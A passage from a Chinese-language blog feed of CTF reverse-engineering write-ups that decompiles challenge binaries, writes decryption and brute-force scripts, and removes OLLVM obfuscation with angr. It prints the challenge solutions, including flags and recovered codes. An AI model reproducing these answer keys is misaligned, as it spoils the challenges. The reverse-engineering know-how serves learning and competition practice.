class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">CheckCode</span><span class="params">(__int64 input_code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 len; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 *code; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// ebp</span></span><br><span class="line">  __int128 v6; <span class="comment">// xmm1</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *v7; <span class="comment">// rbx</span></span><br><span class="line">  __int128 *v8; <span class="comment">// r8</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *v10; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v11; <span class="comment">// r8</span></span><br><span class="line">  __int64 v12; <span class="comment">// rdx</span></span><br><span class="line">  __int128 v13; <span class="comment">// xmm0</span></span><br><span class="line">  __int128 *p_i; <span class="comment">// r8</span></span><br><span class="line">  __int64 v15; <span class="comment">// r9</span></span><br><span class="line">  __int128 *v16; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v17; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v18; <span class="comment">// rax</span></span><br><span class="line">  __int64 v19; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v20; <span class="comment">// rdx</span></span><br><span class="line">  __int128 *v21; <span class="comment">// r8</span></span><br><span class="line">  __int64 v22; <span class="comment">// r9</span></span><br><span class="line">  __int128 *v23; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v24; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v25; <span class="comment">// rax</span></span><br><span class="line">  __int64 v26; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v27; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v29; <span class="comment">// [rsp+0h] [rbp-128h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> key_all[<span class="number">176</span>]; <span class="comment">// [rsp+20h] [rbp-108h] BYREF</span></span><br><span class="line">  __int128 v31; <span class="comment">// [rsp+D0h] [rbp-58h] BYREF</span></span><br><span class="line">  __int128 v32; <span class="comment">// [rsp+E0h] [rbp-48h] BYREF</span></span><br><span class="line">  __int128 i; <span class="comment">// [rsp+F0h] [rbp-38h] BYREF</span></span><br><span class="line">  __int64 v34; <span class="comment">// [rsp+100h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  len = <span class="number">-1</span>i64;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    ++len;</span><br><span class="line">  <span class="keyword">while</span> ( *(_BYTE *)(input_code + len) );</span><br><span class="line">  v3 = (len &amp; <span class="number">0xFFFFFFFFFFFFFFF0</span>ui64) + <span class="number">16</span>;</span><br><span class="line">  code = (<span class="keyword">unsigned</span> __int64 *)sub_7FF881FB3254(v3);<span class="comment">// malloc</span></span><br><span class="line">  sub_7FF881FB4A10((__int64)code, <span class="number">0</span>, v3);       <span class="comment">// memset</span></span><br><span class="line">  sub_7FF881FB7140((<span class="keyword">unsigned</span> __int64)code, (<span class="keyword">const</span> __m128i *)input_code, len);<span class="comment">// memcpy</span></span><br><span class="line">  v5 = <span class="number">32</span>;</span><br><span class="line">  v6 = iv;</span><br><span class="line">  v32 = key;</span><br><span class="line">  <span class="keyword">for</span> ( i = iv; ; v6 = i )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_7FF881FB1420(key_all, &amp;v32);            <span class="comment">// key_exetension</span></span><br><span class="line">    v31 = v6;</span><br><span class="line">    v7 = (<span class="keyword">unsigned</span> __int8 *)code;</span><br><span class="line">    v8 = &amp;v31;</span><br><span class="line">    <span class="keyword">if</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = ((v3 - <span class="number">1</span>) &gt;&gt; <span class="number">4</span>) + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v10 = v7;</span><br><span class="line">        v11 = (<span class="keyword">char</span> *)v8 - (<span class="keyword">char</span> *)v7;</span><br><span class="line">        v12 = <span class="number">16</span>i64;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          *v10 ^= v10[v11];                     <span class="comment">// xor_iv</span></span><br><span class="line">          ++v10;</span><br><span class="line">          --v12;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v12 );</span><br><span class="line">        aes_128(v7, (__int64)key_all);</span><br><span class="line">        v8 = (__int128 *)v7;</span><br><span class="line">        v7 += <span class="number">16</span>;</span><br><span class="line">        --v9;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v9 );</span><br><span class="line">    &#125;</span><br><span class="line">    v13 = *v8;</span><br><span class="line">    p_i = &amp;i;</span><br><span class="line">    v15 = <span class="number">4</span>i64;</span><br><span class="line">    v31 = v13;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v16 = p_i;</span><br><span class="line">      v17 = <span class="number">4</span>i64;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v18 = *(<span class="keyword">unsigned</span> __int8 *)v16;</span><br><span class="line">        v16 = (__int128 *)((<span class="keyword">char</span> *)v16 + <span class="number">4</span>);</span><br><span class="line">        *((_BYTE *)v16 - <span class="number">4</span>) = byte_7FF881FC8770[v18];<span class="comment">// SubByte(iv)</span></span><br><span class="line">        --v17;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v17 );</span><br><span class="line">      p_i = (__int128 *)((<span class="keyword">char</span> *)p_i + <span class="number">1</span>);</span><br><span class="line">      --v15;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v15 );</span><br><span class="line">    v19 = <span class="number">0</span>i64;</span><br><span class="line">    v20 = <span class="number">16</span>i64;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      *((_BYTE *)&amp;v32 + v19) ^= *((_BYTE *)&amp;i + v19);<span class="comment">// key ^= iv</span></span><br><span class="line">      ++v19;</span><br><span class="line">      --v20;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v20 );</span><br><span class="line">    v21 = &amp;v32;</span><br><span class="line">    v22 = <span class="number">4</span>i64;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v23 = v21;</span><br><span class="line">      v24 = <span class="number">4</span>i64;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v25 = *(<span class="keyword">unsigned</span> __int8 *)v23;</span><br><span class="line">        v23 = (__int128 *)((<span class="keyword">char</span> *)v23 + <span class="number">4</span>);</span><br><span class="line">        *((_BYTE *)v23 - <span class="number">4</span>) = byte_7FF881FC8770[v25];<span class="comment">// SubByte(key)</span></span><br><span class="line">        --v24;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v24 );</span><br><span class="line">      v21 = (__int128 *)((<span class="keyword">char</span> *)v21 + <span class="number">1</span>);</span><br><span class="line">      --v22;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v22 );</span><br><span class="line">    v26 = <span class="number">0</span>i64;</span><br><span class="line">    v27 = <span class="number">16</span>i64;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      *((_BYTE *)&amp;i + v26) ^= *((_BYTE *)&amp;v32 + v26);<span class="comment">// iv ^= key</span></span><br><span class="line">      ++v26;</span><br><span class="line">      --v27;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v27 );</span><br><span class="line">    <span class="keyword">if</span> ( !--v5 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_7FF881FC0730(code, (__int64)&amp;byte_7FF881FCB9E0, v3);<span class="comment">// memcmp()</span></span><br><span class="line">  sub_7FF881FB2E90(code);                       <span class="comment">// free</span></span><br><span class="line">  <span class="keyword">return</span> sub_7FF881FB2E40((<span class="keyword">unsigned</span> __int64)&amp;v29 ^ v34);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(key, enc, iv)</span>:</span></span><br><span class="line">    cryptos = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    <span class="comment">#cryptos = AES.new(key, AES.MODE_ECB)</span></span><br><span class="line">    meg = cryptos.decrypt(enc)</span><br><span class="line">    <span class="keyword">return</span> meg</span><br><span class="line"></span><br><span class="line">sbox = [<span class="number">0x63</span>, <span class="number">0x7C</span>, <span class="number">0x77</span>, <span class="number">0x7B</span>, <span class="number">0xF2</span>, <span class="number">0x6B</span>, <span class="number">0x6F</span>, <span class="number">0xC5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x2B</span>, <span class="number">0xFE</span>, <span class="number">0xD7</span>, <span class="number">0xAB</span>, <span class="number">0x76</span>, <span class="number">0xCA</span>, <span class="number">0x82</span>, <span class="number">0xC9</span>, <span class="number">0x7D</span>, <span class="number">0xFA</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xF0</span>, <span class="number">0xAD</span>, <span class="number">0xD4</span>, <span class="number">0xA2</span>, <span class="number">0xAF</span>, <span class="number">0x9C</span>, <span class="number">0xA4</span>, <span class="number">0x72</span>, <span class="number">0xC0</span>, <span class="number">0xB7</span>, <span class="number">0xFD</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3F</span>, <span class="number">0xF7</span>, <span class="number">0xCC</span>, <span class="number">0x34</span>, <span class="number">0xA5</span>, <span class="number">0xE5</span>, <span class="number">0xF1</span>, <span class="number">0x71</span>, <span class="number">0xD8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>, <span class="number">0x04</span>, <span class="number">0xC7</span>, <span class="number">0x23</span>, <span class="number">0xC3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9A</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>, <span class="number">0xEB</span>, <span class="number">0x27</span>, <span class="number">0xB2</span>, <span class="number">0x75</span>, <span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2C</span>, <span class="number">0x1A</span>, <span class="number">0x1B</span>, <span class="number">0x6E</span>, <span class="number">0x5A</span>, <span class="number">0xA0</span>, <span class="number">0x52</span>, <span class="number">0x3B</span>, <span class="number">0xD6</span>, <span class="number">0xB3</span>, <span class="number">0x29</span>, <span class="number">0xE3</span>, <span class="number">0x2F</span>, <span class="number">0x84</span>, <span class="number">0x53</span>, <span class="number">0xD1</span>, <span class="number">0x00</span>, <span class="number">0xED</span>, <span class="number">0x20</span>, <span class="number">0xFC</span>, <span class="number">0xB1</span>, <span class="number">0x5B</span>, <span class="number">0x6A</span>, <span class="number">0xCB</span>, <span class="number">0xBE</span>, <span class="number">0x39</span>, <span class="number">0x4A</span>, <span class="number">0x4C</span>, <span class="number">0x58</span>, <span class="number">0xCF</span>, <span class="number">0xD0</span>, <span class="number">0xEF</span>, <span class="number">0xAA</span>, <span class="number">0xFB</span>, <span class="number">0x43</span>, <span class="number">0x4D</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0xF9</span>, <span class="number">0x02</span>, <span class="number">0x7F</span>, <span class="number">0x50</span>, <span class="number">0x3C</span>, <span class="number">0x9F</span>, <span class="number">0xA8</span>, <span class="number">0x51</span>, <span class="number">0xA3</span>, <span class="number">0x40</span>, <span class="number">0x8F</span>, <span class="number">0x92</span>, <span class="number">0x9D</span>, <span class="number">0x38</span>, <span class="number">0xF5</span>, <span class="number">0xBC</span>, <span class="number">0xB6</span>, <span class="number">0xDA</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xFF</span>, <span class="number">0xF3</span>, <span class="number">0xD2</span>, <span class="number">0xCD</span>, <span class="number">0x0C</span>, <span class="number">0x13</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>, <span class="number">0xC4</span>, <span class="number">0xA7</span>, <span class="number">0x7E</span>, <span class="number">0x3D</span>, <span class="number">0x64</span>, <span class="number">0x5D</span>, <span class="number">0x19</span>, <span class="number">0x73</span>, <span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4F</span>, <span class="number">0xDC</span>, <span class="number">0x22</span>, <span class="number">0x2A</span>, <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xEE</span>, <span class="number">0xB8</span>, <span class="number">0x14</span>, <span class="number">0xDE</span>, <span class="number">0x5E</span>, <span class="number">0x0B</span>, <span class="number">0xDB</span>, <span class="number">0xE0</span>, <span class="number">0x32</span>, <span class="number">0x3A</span>, <span class="number">0x0A</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5C</span>, <span class="number">0xC2</span>, <span class="number">0xD3</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xE4</span>, <span class="number">0x79</span>, <span class="number">0xE7</span>, <span class="number">0xC8</span>, <span class="number">0x37</span>, <span class="number">0x6D</span>, <span class="number">0x8D</span>, <span class="number">0xD5</span>, <span class="number">0x4E</span>, <span class="number">0xA9</span>, <span class="number">0x6C</span>, <span class="number">0x56</span>, <span class="number">0xF4</span>, <span class="number">0xEA</span>, <span class="number">0x65</span>, <span class="number">0x7A</span>, <span class="number">0xAE</span>, <span class="number">0x08</span>, <span class="number">0xBA</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2E</span>, <span class="number">0x1C</span>, <span class="number">0xA6</span>, <span class="number">0xB4</span>, <span class="number">0xC6</span>, <span class="number">0xE8</span>, <span class="number">0xDD</span>, <span class="number">0x74</span>, <span class="number">0x1F</span>, <span class="number">0x4B</span>, <span class="number">0xBD</span>, <span class="number">0x8B</span>, <span class="number">0x8A</span>, <span class="number">0x70</span>, <span class="number">0x3E</span>, <span class="number">0xB5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xF6</span>, <span class="number">0x0E</span>, <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xB9</span>, <span class="number">0x86</span>, <span class="number">0xC1</span>, <span class="number">0x1D</span>, <span class="number">0x9E</span>, <span class="number">0xE1</span>, <span class="number">0xF8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xD9</span>, <span class="number">0x8E</span>, <span class="number">0x94</span>, <span class="number">0x9B</span>, <span class="number">0x1E</span>, <span class="number">0x87</span>, <span class="number">0xE9</span>, <span class="number">0xCE</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xDF</span>, <span class="number">0x8C</span>, <span class="number">0xA1</span>, <span class="number">0x89</span>, <span class="number">0x0D</span>, <span class="number">0xBF</span>, <span class="number">0xE6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0x2D</span>, <span class="number">0x0F</span>, <span class="number">0xB0</span>, <span class="number">0x54</span>, <span class="number">0xBB</span>, <span class="number">0x16</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span class="number">0xEBE9BBF1F1499052AED66CE184BE2329</span></span><br><span class="line">key = key.to_bytes(<span class="number">16</span>, <span class="string">"little"</span>)</span><br><span class="line">iv = <span class="number">0x0DE47B7061C0D5E24993E0C873CDBA6B3</span></span><br><span class="line">iv = iv.to_bytes(<span class="number">16</span>, <span class="string">"little"</span>)</span><br><span class="line"></span><br><span class="line">enc = bytes([<span class="number">0xF6</span>, <span class="number">0x1C</span>, <span class="number">0xE3</span>, <span class="number">0xD7</span>, <span class="number">0xF9</span>, <span class="number">0xFB</span>, <span class="number">0x0B</span>, <span class="number">0x1A</span>, <span class="number">0x8B</span>, <span class="number">0xA2</span>, <span class="number">0x1D</span>, <span class="number">0xD8</span>, <span class="number">0x97</span>, <span class="number">0x94</span>, <span class="number">0x05</span>, <span class="number">0xC4</span>, <span class="number">0x6D</span>, <span class="number">0x97</span>, <span class="number">0xE7</span>, <span class="number">0x62</span>, <span class="number">0xB6</span>, <span class="number">0x7C</span>, <span class="number">0xEF</span>, <span class="number">0x9A</span>, <span class="number">0x88</span>, <span class="number">0x1B</span>, <span class="number">0xA4</span>, <span class="number">0x4D</span>, <span class="number">0xFD</span>, <span class="number">0xB0</span>, <span class="number">0xE4</span>, <span class="number">0x6E</span>])</span><br><span class="line"></span><br><span class="line">rsbox = [<span class="number">0</span>]*<span class="number">256</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(sbox)):</span><br><span class="line">    rsbox[sbox[i]] = i</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">31</span>):</span><br><span class="line">    iv = [sbox[i] <span class="keyword">for</span> i <span class="keyword">in</span> iv]</span><br><span class="line">    key = [key[i]^iv[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)]</span><br><span class="line">    key = [sbox[i] <span class="keyword">for</span> i <span class="keyword">in</span> key]</span><br><span class="line">    iv = [key[i]^iv[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)]</span><br><span class="line">    key = bytes(key)</span><br><span class="line">    iv = bytes(iv)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    enc = decrypt(key, enc, iv)</span><br><span class="line">    iv = [key[i]^iv[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)]</span><br><span class="line">    key = [rsbox[i] <span class="keyword">for</span> i <span class="keyword">in</span> key]</span><br><span class="line">    key = [key[i]^iv[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)]</span><br><span class="line">    iv = [rsbox[i] <span class="keyword">for</span> i <span class="keyword">in</span> iv]</span><br><span class="line">    key = bytes(key)</span><br><span class="line">    iv = bytes(iv)</span><br><span class="line"></span><br><span class="line">code = enc</span><br><span class="line">id = [<span class="number">7</span>, <span class="number">90</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">117</span>, <span class="number">99</span>, <span class="number">114</span>, <span class="number">97</span>, <span class="number">24</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(code)):</span><br><span class="line">    id[i%len(id)] ^= code[i]</span><br><span class="line">print(<span class="string">"id = "</span>, bytes(id))</span><br><span class="line">print(<span class="string">"code = "</span>, bytes(code))</span><br><span class="line"></span><br><span class="line"><span class="comment">#id =  b'ginkgo_CX'</span></span><br><span class="line"><span class="comment">#code =  b'Meaningless_!$!%*@^%#%_Code\x00\x00\x00\x00\x00'</span></span><br></pre></td></tr></table></figure><p>验证：</p><p><img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20220120173429616.png" alt="image-20220120173429616"></p>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2019安洵杯</title>
      <link href="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/"/>
      <url>/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<blockquote><p>学习逆向之后，在github找题目进行复现的。</p></blockquote><a id="more"></a><h2 id="Easy-Encryption"><a href="#Easy-Encryption" class="headerlink" title="Easy_Encryption"></a>Easy_Encryption</h2><p>提示很多，直接找到main函数，简单分析一下，对输入flag进行2个加密函数后，最后与一个已知密文比较。其中第二个明显的base64加密。</p><p>来到一个加密函数，由于ida栈顶分析失败导致，直接alt+k修改一下就可以了。<img src="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20200815162136204.png" alt="image-20200815162136204"></p><p>愉快的看伪代码，一个注意的地方：<img src="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20200815162346063.png" alt="image-20200815162346063"></p><p>直接简单的爆破。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[] = <span class="string">"artqkoehqpkbihv"</span>, i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> base[] = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; base[i]; i++)</span><br><span class="line">base[i] = <span class="built_in">abs</span>(base[i]<span class="number">-97</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= s[i]; i++)</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">97</span>; j &lt;= <span class="number">122</span>; j++)</span><br><span class="line"><span class="keyword">if</span>((j+base[i]<span class="number">-97</span>)%<span class="number">26</span>+<span class="number">97</span> == s[i])</span><br><span class="line"><span class="built_in">putchar</span>(j);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//flag: umpnineissogood</span></span><br></pre></td></tr></table></figure><h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p>ida载入后，发现伪代码十分难看。。。看了一会儿，实在不想分析了，所有函数都是一种形式，感觉是什么混淆代码的技术。</p><p>百度后，发现是ollvm，控制流平坦化技术。</p><blockquote><p>控制流平坦化(control flow flattening)的基本思想主要是通过一个主分发器来控制程序基本块的执行流程，这个主分发器就是函数中的switch语句。</p></blockquote><p>且目前可以利用符号执行来去除控制流平坦化。<a href="https://security.tencent.com/index.php/blog/msg/112" target="_blank" rel="noopener">利用符号执行去除控制流平坦化</a></p><p>而这也需要angr，网上说的都是建议安装在python虚拟环境中。</p><p>跟着教程安装完虚拟环境并创建后，但angr又安装失败。。。后面发现还可以直接用dokcer。</p><p>了解一波docker，<a href="https://www.cnblogs.com/blog-rui/p/11244023.html" target="_blank" rel="noopener">docker</a>，折腾一些时间（谷歌大法帮了大忙👍）后成功执行deflat.py脚本。<img src="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20200815165930112.png" alt="image-20200815165930112"></p><p>又是愉快的伪代码，简单就不分析了，使用gdb动调出2个对比的数独表，找出差异的数字，即0所在位置。<img src="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20200815170400494.png" alt="image-20200815170400494"></p><p>然后使用notepad++找不不同：<img src="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20200815170436332.png" alt="image-20200815170436332"></p><p>最后简单解密一下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[] = <span class="string">"4693641762894685722843556137219876255986"</span>;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, k = <span class="number">0</span>, count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; s[i]; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">33</span>; j &lt;= <span class="number">122</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(((j&amp;<span class="number">0xf3</span> | ~j&amp;<span class="number">0xc</span>)<span class="number">-20</span>) == s[i])</span><br><span class="line">&#123;</span><br><span class="line">s[i] = j;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span 